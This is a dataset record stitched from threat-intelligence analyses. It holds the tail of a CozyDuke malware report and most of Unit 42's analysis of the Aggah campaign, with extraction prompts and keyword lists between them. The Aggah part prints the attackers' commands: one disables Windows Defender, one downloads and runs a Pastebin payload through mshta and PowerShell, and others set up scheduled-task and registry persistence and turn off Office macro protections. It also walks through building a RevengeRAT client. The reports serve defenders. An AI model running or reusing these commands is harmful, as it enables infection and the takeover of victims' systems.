matches a name on the list, the dropper will immediately exit. Newer versions of the dropper will perform additional checks to ensure the dropper is not being executed inside a virtual machine or a known malware analysis sandbox environment. Should either of these checks fail, the dropper will likewise exit immediately.Next, the dropper will find and decrypt encrypted data stored as two PE resources embedded in the executable. These resources are named with the hexadecimal identifiers 0x000A and 0x000B. Both resources are structured similarily. They begin with a four-byte value specifying the length of the included decryption key. This decryption key immediately follows the length field. Finally, the rest of the resource is the encrypted payload. The encryption used is a simple XOR with a rotating key.The first resource, 0x000A, contains as its payload a Microsoft cabinet archive. This archive contains the CozyDuke components that the dropper will later install on the victim system. The second resource, 0x000B, contains as its payload an XML file with instructions for the dropper on where to install the dropped components and what to name them.The dropper will then proceed to write the CozyDuke components to the specified location. The dropper will additionally copy the system file rundll32.exe to the install location for CozyDuke. This file will also use a name specified in the droppers configuration file. Finally, the dropper will use the copy of rundll32.exe to load and execute the CozyDuke main component.EncryptedconfigurationfileCozyDuke components4COZYDUKE MAIN COMPONENTOverview The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke’s activity on a victim machine. The main component is executed by the CozyDuke dropper using a copy of rundll32.exe. The entrypoint function varies, but is always specified in the dropper configuration.The most important functionalities offered by the main component are establishment of persistence, gathering of basic system information, communication with the C&C server and the execution of additional tasks, modules or executables as commanded by the C&C server.PersistenceCozyDuke may use multiple techniques for establishing persistence; the following is one technique used. Firstly, CozyDuke may set itself to be executed at system startup by adding a registry value under any of the following registry keys:• HKLM\Software\Microsoft\Windows\CurrentVersion\Run\• HKCU\Software\Microsoft\Windows\CurrentVersion\Run\• HKLM\Software\Microsoft\Windows\ CurrentVersion\Policies\Explorer\Run • HKCU\Software\Microsoft\Windows\ CurrentVersion\Policies\Explorer\RunThe name of the registry value will usually be the filename, (without the extension) of the CozyDuke main component.CozyDuke may also register itself as a Windows service or scheduled task. Additionally, CozyDuke may utilize a technique known as COM-object hijacking [1] to establish persistence. To achieve this, CozyDuke will “hijack” the registry entries for the COM object “SharedTaskScheduler”. CozyDuke will modify the registry entries in such a way that any loading of the SharedTaskScheduler COM object will first load a special CozyDuke module that will ensure CozyDuke stays active on the victim host.Configuration dataThe configuration data for CozyDuke is stored as a separate RC4-encrypted file that is written to disk by the CozyDuke dropper during initial infection. The name of the encrypted configuration file on disk has been racss. dat in all of the observed cases. The decrypted file is data has been encrypted with the RC4 key B5 78 62 52 98 3E 24 D7 3B C6 EE 7C B9 ED 91 62. In CozyDuke samples from July of 2014, the RC4 key has been embedded in the encrypted configuration file. In this case, the encrypted configuration file will begin with a 4-byte value specifying the length of the included RC4 key. This will be followed by the actual key. Finally, the rest of the file will be the actual configuration data.Command and control communicationCozyDuke’s main method of communicating with its command and control server is using either HTTP or HTTPS. The method of communication, as well as the address to connect to, are specified in CozyDuke’s configuration data. In the cases we have observed, the configuration data for any single CozyDuke instance has included the details of either one or two C&C servers. Listed above are details of known CozyDuke C&C servers. We believe all of the ones listed are compromised servers.In addition to its main communication method, CozyDuke also features the ability to use Twitter as a backup C&C channel. In cases where CozyDuke utilizes this functionality, the twitter account to be used will be specified in CozyDuke’s configuration data. We have only observed two samples where a backup Twitter account was actually specified in the configuration data. These accounts were @US2515 and @monkey_drive.TasksCozyDuke’s primary purpose is the execution of tasks. These tasks usually involve the execution of modules or executables providing additional functionality. The main difference between the two is that modules are DLL files loaded in memory by the CozyDuke main component, whereas executables are PE executable files that CozyDuke will write to disk and execute.For the purpose of managing tasks, the main component of CozyDuke implements 6 commands that the C&C server can specify. These commands are briefly described in Table 2 (overleaf).REFERENCEI. GData; Paul Rascagneres; COM Object hijacking: the discreet way of persistence: An Analysis of a new persistence mechanism in the wild;published 30.10.2014; url 2: 6 COZYDUKE C&C SERVER COMMANDSCommand Modify task or configuration Upload data Download dataThe following chapter, CozyDuke Tasks, provides further information on the tasks CozyDuke has been observed executing.COZYDUKE TASKSBased on samples obtained from our own collections and generously shared to us by a trusted source, we have been able to identify some of the tasks executed recently by CozyDuke. These tasks can be divided into two categories. The first consists of CozyDuke modules which are DLL files loaded in memory by the main component of CozyDuke for the purposes of extending CozyDuke’s functionality. The second category consists of PE executable files that CozyDuke will write to disk and execute on the infected host. These executables are usually droppers similar to those used to infect a host with CozyDuke. In this case, however, instead of dropping CozyDuke, the executables may drop other executables, scripts or DLLs. Once executed by CozyDuke, these executables function independently of CozyDuke’s main component.ModulesListed below are the modules we have observed being used:TABLE 3: COZYDUKE MODULESModule Type Can be used to execute arbitrary commands by invoking C:\ Windows\System32\cmd.exe Will attempt to harvest stored credentials from the victim Will attempt to harvest credentials stored on the victim host that are used as part of Windows NTLM user authentication Will attempt to gather comprehensive information on the victim host’s configuration Will take a screenshot of the victim hostExecutablesWe have observed executables executed by CozyDuke for the following purposes:• Dropping and executing scripts for collectinginformation and credentials from the victim organization’s Active Directory environment• Dropping and executing scripts for furtherpenetrating the victim organization with the help of commonly available tools such as Mimikatz and PSExec• Dropping and executing additional malware withthe same file and export naming conventions as OnionDuke and the same string encryption algorithm as OnionDukeThese executables will implement their own methods of C&C communication and data exfiltration. In many cases, the scripts utilized Microsoft OneDrive accounts for data transfer.COZYDUKE EVOLUTION The earliest CozyDuke sample we have observed so far was compiled on the 29th of December, 2011. The sample in question was not an actual CozyDuke main component, but a CozyDuke module. The earliest main component we observed was compiled on the 29th of February, 2012. The main component in question stores its strings and configuration in an unencrypted form. Additionally, the configuration is stored embedded in the binary, not as a separate XML file in the manner of newer CozyDuke versions. Even this oldest main component does however use XML for other purposes via the open-source Pugi-XML library.The next CozyDuke main component we observed was compiled on the 30th of November, 2012. By then, the authors had switched to encrypting the strings and the configuration. However, the configuration was still stored embedded in the binary. Design-wise, this sample is a bit of an outlier. Instead of being a DLL file, the main component is actually an EXE that, in addition to the configuration, embeds multiple DLLs that provide additional functionality to the main component. Apart from the different design, functionally the main component is very similar to other CozyDuke main components. It is possible the authors of CozyDuke were trying out a new design, but eventually decided to go back to the original.The next CozyDuke main component we observed, compiled on the 2nd of July, 2014, is again a DLL file. By now, the authors of CozyDuke had switched fromFIGURE 4: TIMELINE OF COZYDUKE EVOLUTION7Executable CozyDuke main component30/11/12426KB EXEEncrypted strings29/12/11Oldest known CozyDuke moduleUnencrypted stringsEncrypted embedded configuration26/2/15CozyDuke main component820KB DLLEncrypted stringsEncrypted external configuration2012201320142015Oldest known CozyDuke main module29/2/12266KB DLLUnencrypted stringsUnencrypted embedded configurationan embedded configuration to the external XML- formatted configuration file seen today. We have yet to observe samples from 2013, but we believe CozyDuke to have been under active development as well during that year. Between 2012 and 2014, the authors of CozyDuke appear to have performed significant refactoring of the CozyDuke codebase, even though functionally the differences are smaller. Examples of this refactoring include for instance the switch from using the Pugi-XML library to using Microsoft’s MSXML 3.0 for XML-related functionality.The latest CozyDuke main component we observed was compiled on the 26th of February, 2015. The core functionality of the latest sample is very similar to the previous sample from July of 2014, but the authors of CozyDuke have implemented a lot of additional functionality, as the increase in size from 279KB to 820KB would also suggest.2/7/14CozyDuke main component279KB DLLEncrypted stringsEncrypted external configurationCOZYDUKE TERMINOLOGY AND NAMING Based on logging strings, variable naming and PDB strings found in CozyDuke samples, we observed the following:• The internal name for CozyDuke is “Agent” • The CozyDuke main component’s functionality•revolves around the execution of “tasks” that are often associated with “modules” It is possible that the name “Agent” is not the original internal name of CozyDuke and that the name was changed sometime in 2011 with the original project name being “Agent_NextGen”• Sometime in 2011, CozyDuke was identifiedinternally as being version 3PDB strings found in early CozyDuke samples are listed in Table 4 (below).TABLE 4: COZYDUKE PDB STRINGSCompilation timestamp PDB string Mon Feb 13 13:07:04 2012 (UTC) Wed Dec 28 13:23:04 2011 (UTC) Thu Jan 26 13:57:00 2012 (UTC)E:\Visual Studio 2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\tasks\bin\ GetPasswords\exe\GetPasswords.pdb screeshots.pdb8APPENDIX A | SAMPLE HASHES • Java/1.8.0_25 • Java/1.8.0_26 • • Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;iTunes/12.0.1 (Windows; N)rv:11.0) like Gecko• Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0)Gecko/20100101 Firefox/32.0• Mozilla/5.0 (Windows NT 6.1; WOW64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome /34.0.1847.137 Safari/537.36Mutexes • AgentMutexAPPENDIX B: IOCSFilenames(Note: we believe many of these to be borrowed from legitimate files)agent_wininet_dl.exe• • coinst_13.152.dll ","{'phrases': ['email', 'links', 'the victim', 'Download', 'a CozyDuke dropper', 'a self-extracting RAR archive', 'the dropper', 'the CozyDuke components', 'an encrypted configuration file', 'the CozyDuke main component', 'DLL', 'command', 'control', 'communication', 'tasks', 'additional modules', 'tools', 'scripts', 'executables', 'data', 'system', 'persistence', 'registry', 'keys', 'access', 'infrastructure'], 'target': 'email; links; the victim; Download; a CozyDuke dropper; a self-extracting RAR archive; the dropper; the CozyDuke components; an encrypted configuration file; the CozyDuke main component; DLL; command; control; communication; tasks; additional modules; tools; scripts; executables; data; system; persistence; registry; keys; access; infrastructure.'}"
the attack; a Word document; macros; The document; Template Injection; The macro; Dropper; Pastebin; the C2 server; a short URL; the RevengeRAT payload; the payload; persistence; the malware; C2 server.,[' 1. Phishing emails with weaponized Office docs are sent to victims. 2. Macros in the docs fetch scripts from Blogspot and Pastebin. 3. Scripts disable security products and deliver RevengeRAT. 4. RevengeRAT configures command and control communication. 5. The attacker interacts with the victim through the RAT to steal data. 6. Stolen data is likely used for additional exploitation or sold on dark web markets. '],"Extract the keywords: 4/22/2019Aggah Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignAggah Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignunit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaignBy Robert Falcone and Brittany Ash Executive Summary In March 2019, Unit 42 began looking into an attack campaign that appeared to be primarily focused on organizations within a Middle Eastern country. Further analysis revealed that this activity is likely part of a much larger campaign impacting not only that region but also the United States, and throughout Europe and Asia.April 17, 2019Our analysis of the delivery document revealed it was built to load a malicious macro-enabled document from a remote server via Template Injection. These macros use BlogSpot posts to obtain a script that uses multiple Pastebin pastes to download additional scripts, which ultimately result in the ﬁnal payload being RevengeRAT conﬁgured with a duckdns[.]org domain for C2. During our research, we found several related delivery documents that followed the same process to ultimately install RevengeRAT hosted on Pastebin, which suggests the actors used these TTPs throughout their attack campaign. Initially, we believed this activity to be potentially associated with the Gorgon Group. Our hypothesis was based on the high level TTPs including the use of RevengeRAT. However, Unit 42 has not yet identiﬁed direct overlaps with other high-ﬁdelity Gorgon Group indicators. Based on this, we are not able to assign this activity to the Gorgon group with an appropriate level of certainty.In light of that, Unit 42 refers to the activity described in this blog as the Aggah Campaign based on the actor’s alias “hagga”, which was used to split data sent to the RevengeRAT C2 server and was the name of one of the Pastebin accounts used to host the RevengeRAT payloads. The Delivery Our research into the Aggah campaign began with a delivery document sent to organizations in a single Middle Eastern country via an email on March 27, 2019. This email appeared to originate from a large ﬁnancial institution in the same country, although it was likely spoofed. The subject of the email was “Your account is locked.” This initial delivery document was sent to organizations in one Middle Eastern country, speciﬁcally to organizations in the education, media/marketing, and government verticals. Four days later on March 31, we saw the same delivery email sent to a ﬁnancial organization in a second Middle Eastern country. We later discovered that this delivery document was just one of many in a larger campaign sent to organizations in the United States, Europe and Asia targeting the same verticals as in the Middle East as well as Technology, Retail, Manufacturing, State/Local Government, Hospitality, Medical, Technology, and other Professional business. The related documents were functionally similar, so we will describe the original sample we analyzed. The email sent on March 27 had a Word document attached with the ﬁlename “Activity.doc” (SHA256: “Activity.doc” is opened, it displays the image in Figure 1 as a lure in an attempt to trick the user into enabling content to allow macros to run. The lure suggests that the user must open the document in the desktop versions of Microsoft Word, as macros do not function in the online version of Word in Ofﬁce 365.The “Activity.doc” ﬁle does not contain a macro, but the OLE document that it loads from the remote server does contain a macro.Figure 1. Lure image used in Activity.doc to trick user into enabling macros Activity.doc Analysis The delivery document uses Template Injection to load a ﬁle hosted on a remote server. Figure 2 shows the contents of the delivery document’s footer that attempts to signiﬁcant amount of ‘junk’ code. The purpose of this macro is to decode and execute the following URL via the “Shell” command: mshta hxxp://www.bitly[.]com/SmexEaldos3The command above uses the built-in “mshta” application to download the contents of URL provided, in this case a shortened URL using the Bit.ly service. During WildFire’s analysis, the shortened bit.ly URL redirected to hxxps://bjm9.blogspot[.]com/p/si.html, as seen in the “Location” ﬁeld of the HTTP response in Figure 3.Figure 3. Bit.ly shortened link pointing to blog hosted at BlogspotAs you can see in the GET request above, the redirect points the browser (“mshta.exe” in this case) to a blog hosted on blogspot[.]com. As you can see in Figure 4, this BlogSpot article appears a bit odd but not necessarily malicious.Figure 4. bjm9.blogspot[.]com screen captureBy analyzing the code hosted on the blog, we discovered it actually includes a JavaScript embedded within it that performs several activities. Figure 5 shows the malicious JavaScript hosted at the seemingly innocuous blog.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 5. Script embedded in bjm9 Blogspot article The malicious script carries out several activities on the compromised system. First, it attempts to hamper Microsoft Defender by removing its signature set. The script also kills the Defender process along with the processes for several Ofﬁce applications. All of this is performed using the following command line:cmd.exe /c cd “”%ProgramFiles%\Windows Defender”” & MpCmdRun.exe -removedeﬁnitions -dynamicsignatures & taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE & forﬁles /c “”taskkill /f /im MSASCuiL.exe”” & forﬁles /c “”taskkill /f /im MpCmdRun.exe”” & exitThe script then attempts to disable security mechanisms within Ofﬁce products, speciﬁcally by setting registry key values to enable macros and to disable ProtectedView. First, the script enables macros within Word, PowerPoint and Excel by setting the following registry keys to a value of “1”: HKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\VBAWarningsHKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\VBAWarnings HKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\VBAWarningsThe script then attempts to disable the ProtectedView security mechanism within Word, PowerPoint and Excel by setting the following registry keys to a value of “1”:HKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\11.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\ProtectedView\DisableInternetFilesInPV HKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignHKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\12.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\14.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\14.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\ProtectedView\DisableAttachementsInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\15.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\16.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\16.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\ProtectedView\DisableInternetFilesInPVHKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\ProtectedView\DisableAttachementsInPV HKCU\Software\Microsoft\Ofﬁce\16.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPVThe technique of enabling macros and disabling ProtectedView in Ofﬁce, including the order in which the registry keys were modiﬁed was also described in our blog covering the Gorgon group. Also, the tactic of killing processes for Windows Defender and Microsoft Ofﬁce applications was also carried out by Gorgon as well. The Gorgon group also used the bitly URL shortening service in their attacks, but while these are obvious technique overlaps, we still do not have concrete evidence that this attack campaign is associated with Gorgon.The script hosted on Blogspot then carries out three main activities that include:1. Downloading a payload from a Pastebin URL 2. Creating a scheduled task to periodically obtain and run a script from a Pastebin URL 3. Creating an autorun registry key to obtain and run a script from a Pastebin URLObtaining a payload from Pastebin The script hosted at Blogspot obtains a portable executable payload from a Pastebin URL and executes it. The script builds the following command and attempts to run it using the WScript.Shell object:url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignmshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”powershell.exe -noexit -command [Reﬂection.Assembly]::Load([System.Convert]::FromBase64String((New- Object Net.WebClient).DownloadString(\’h\’+\’t\’+\’t\’+\’p\’+\’s:\’+\’//p\’+\’a\’+\’s\’+\’t\’+\’e\’+\’b\’+\’i\’+\’n\’+\’.\’+\’c\’+\’o\’+\’m\’+\’/\’+\’r\’+\’a\’+\’w\’+\’/\’+\’2LDaeHE1\’))).EntryPoint.Invoke($N,$ (window.close)The command above results in the downloading of a portable executable hosted on Pastebin at url decoding the base64 downloaded from the URL, and then executing it. Figure 6 shows the Pastebin page hosting the executable downloaded by the script.Figure 6. 2LDaeHE1 Pastebin pageThe decoded payload has the following attributes:SHA256 2019-03-20 19:43:08Table 2. Decoded payload from pastebin[.]com/raw/2LDaeHE1This payload was written in VB.NET and named “Nuclear Explosion,” which is a variant of RevengeRAT conﬁgured to use the domain “lulla.duckdns[.]org” for C2, as seen in Figure 7.Figure 7. RevengeRAT conﬁgurationAccording to its conﬁguration seen in Figure 8, when sending data to the C2 server, it will split the information using the string “hagga“, which is the same name as the PasteBin account hosting the payload information seen in Figure 6 and the basis of the Aggah campaign name.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 8. Conﬁguration showing the string “hagga” used to split information sent to the C2 server Creating a Scheduled Task The script hosted at the Blogspot blog builds another command to create a scheduled task called “eScan Backup” that runs every 100 minutes. The command string generated by the script used to create this scheduled task is:schtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr “”mshta vbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe url””,0,true)(window.close)”” /F ‘The “eScan Backup” task will use the built-in mshta application to download a script from a Pastebin URL, speciﬁcally at hxxps://pastebin[.]com/raw/tb5gHu2G that we will continue to refer to as the tb5gHu2G script. We believe the actors chose the name “eScan Backup” to appear related to the eScan antivirus products. Figure 9 shows the scheduled task in Windows’ Task Scheduler program.Figure 9. Scheduled task created to reach out to Pastebin URL and run the hosted script every 100 minutes The scheduled task downloading and running the tb5gHu2G script is meant for persistence, as it runs the same command to hamper Windows Defender and kill Ofﬁce applications. The tb5gHu2G script also attempts to run the same VBScript as the script hosted on the Blogspot blog, of which downloads and executes the payload from the “2LDaeHE1” Pastebin page shown in Figure 6. Figure 10 shows the Pastebin page hosting the tb5gHu2G script.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 10. tb5gHu2G Pastebin page Creating an Autorun Registry Key The script hosted at the Blogspot blog creates an autorun registry key, which appears to be a second persistence mechanism to supplement the previously mentioned scheduled task. To create the autorun key, the script generates the following command that it will attempt to run:CreateObject(“Wscript.Shell”).regwrite “HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate”, “C:\Windows\System32\mshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe%20url″”,0,true)(window.close)” , “REG_EXPAND_SZ” This run key will attempt to download the contents hosted at yet another Pastebin URL of url run the contents as a script using the Wscript.Shell object. Figure 11 shows the Pastebin page displaying the contents of the script.Figure 11. YYZq1XR0 Pastebin pageThe YYZq1XR0 Pastebin paste contains the following script that does very little:<script language=”VBScript”> self.closeurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignThe fact that the above script does so little suggests that the actor may update this paste with a new script containing additional functionality when desired. The editing of pastes is possible if the paste was created using a “Pro” account. These pastes were created by an account named HAGGA, which appears to be a PRO account that would allow the actor to update the script to run on infected systems. HAGGA has several additional pastes as well as seen below in Figure 12. These pastes contain additional malicious scripts that are ultimately used to create a payload.Figure 12. Hagga’s Pastebin page Part of a Larger Campaign? While investigating this particular campaign we reviewed the click count available on Bit.ly. As of April 11, 2019, the Bit.ly link, SmexEaldos3, referenced in the analysis above contained over 1,900 clicks in about 20 countries spanning North America, Europe, Asia, and the Middle East. This high volume click-count indicated to us that we were likely only looking at an extremely small subset of the actual campaign. It is also highly likely that these click counts also include individuals accessing the shortened link during investigations and research efforts; therefore, the number is not an accurate representation of the number of hosts infected.Figure 13. bitly SmexEaldos3 page clicksurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignDigging in a bit further we took a look at the document properties to see what additional information we may be able to use to help identify related activity. The document properties indicate these operators were using an apparently pirated version of Microsoft Word and used the string ‘Lulli moti myri’ as the creator/author of the document. Using this string we searched in our repositories and identiﬁed over a dozen Microsoft Ofﬁce documents – half of them DOCX and the other half XLS.All of the documents have a time stamp between January and April 2019, and each contained a Bit.ly URL that redirects to a Blogspot page. While all of these After reviewing all of the delivery documents and RevengeRAT payloads we discovered that all but one payload contains the mutex RV_MUTEX- WindowsUpdateSysten32 (note the purposeful misspelling by the attackers of “Systen32” for “System32”) with a base64 encoded identiﬁer of SE9URUlTIE5PVk9T that decodes to HOTEIS NOVOS (“NEW HOTELS” in Portuguese). We searched through our available repositories to see just how many samples contained these strings. We found over 50 ﬁles beginning as early as September 2018, which are noted in Appendix A. Many of these samples contained the same ‘hagga’ key; however, we also noted three other additional keys: ‘oldman’, ‘steve’, and ‘roma225’. The ‘roma225’ key was discussed in December 2018 in a publication titled ‘The Enigmatic “Roma225” Campaign’ by Yoroi. The one sample that was not conﬁgured with that mutex and identifer was the sample noted in Table 5. That sample contains the mutex RV_MUTEX-cuiGGjjtnxDpnF and the Identiﬁer TWlsZWdvbmE= which decodes to ‘Milegona’. Correlating RevengeRAT samples RevengeRAT is a commodity Trojan that has many leaked builders freely available in open source, which makes attributing the tool’s use to a speciﬁc actor or attack campaign difﬁcult. Because of this, we wanted to determine if the mutex, identiﬁer and key seen in Aggah related samples were not standard default values for RevengeRAT and if they were strong enough to use for pivoting and correlation purposes. To gauge the likelihood of two unrelated actors using the same values in the conﬁguration, we used the leaked RevengeRAT builder (v0.3) to visualize the process an actor would have to take to create RevengeRAT samples that shared the same mutex, identiﬁer and key as the payload delivered in the Aggah campaign.To our surprise, we found it was rather unlikely that two unrelated individuals would use the mutex, identiﬁer, and key just by happenstance. We believe this as the actor must manually enter the mutex, identiﬁer, and key into speciﬁc ﬁelds within the RevengeRAT builder, in which we will highlight in the following explanation of steps required to build the Trojan. To create the RevengeRAT payload used in this campaign, the actor would use the RevengeRAT server to compile an executable conﬁgured with the appropriate ﬁelds. First, the actor would set the “Socket Key” ﬁeld to “hagga” and press “Start Listening”, as seen in Figure 14.Figure 14. RevengeRAT Builder Socket Key SettingOnce the server is conﬁgured and listening, the actor would click the “Client Builder” button to create the RevengeRAT client, as seen in Figure 15.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 15. RevengeRAT Client Builder In the Client Builder, the actor would click the “Network Settings” drop down and enter the domain “lulla.duckdns[.]org” and the TCP port of 2336 before pressing the add button seen in Figure 16.Figure 16. RevengeRAT Network Settings setup The actor would then click the Basic Settings drop down and enter their chosen identiﬁer “HOTEIS NOVOS” into the “Client Identiﬁer” ﬁeld and would add “- WindowsUpdateSysten32” in the “Client Mutex” ﬁeld, as it already contains “RV_MUTEX” by default. Figure 17 shows these values added to the correct ﬁelds. What is of interest to note here is that the actor manually added the string “-WindowsUpdateSysten32” instead of clicking the plus (“+”) button available next to this ﬁeld, which would concatenate a hyphen and a random string instead.url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale CampaignFigure 17. RevengeRAT Basic Settings setup Lastly, to compile the payload the actor has to agree to the Terms of Service and click the “Compile” button, as seen in Figure 18.Figure 18. RevengeRAT Ready to compile By pressing the compile button, the RevengeRAT server will create a client executable with a default name of “Client.exe” that the actor can save to the system prior to delivering it in their attack. Figure 19 shows the RevengeRAT client icon on the desktop.Figure 19. RevengeRAT Client IconThe conﬁguration within the compiled “Client.exe” seen in Figures 16 and 17 visually matches the conﬁguration of the RevengeRAT downloaded from Pastebin in the Aggah campaign, as seen in Figures 7 and 8. This suggests that the actor(s) involved in this campaign would have followed similar steps to create their payload. The sequence of steps carried out to create RevengeRAT payloads that share the same client identiﬁers and socket keys suggests with a high conﬁdence that a common actor is involved.Conclusion Initially, according to our telemetry it appeared as though this could be a very focused effort to target organizations within one Middle Eastern country. However, after further analysis this appears to be just a small part of a much larger campaign which also seems to be affecting many regions including but not limited to the United States, Europe, and Asia. Unfortunately, our current data set does not afford insight into the attackers’ motivation other than to compromise a large number of victims.While a lot of this activity behaviorally appears to be potentially related to the Gorgon Group’s criminal activity, it is currently unclear and requires additional analysis to prove. Both Unit 42 and Yoroi recently released similar blogs which also displayed similar tactics but were not assessed with a high level of conﬁdence as related to the Gorgon Group. Although we are unsure of a connection to the Gorgon Group speciﬁcally, we do assess that based on the unique conﬁguration of these RevengeRATurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignsamples that a common operator was likely involved in the activity mentioned in this blog.RevengeRAT is a publicly available RAT which is seen in high volume. It appears as though some users of this RAT have moved from following 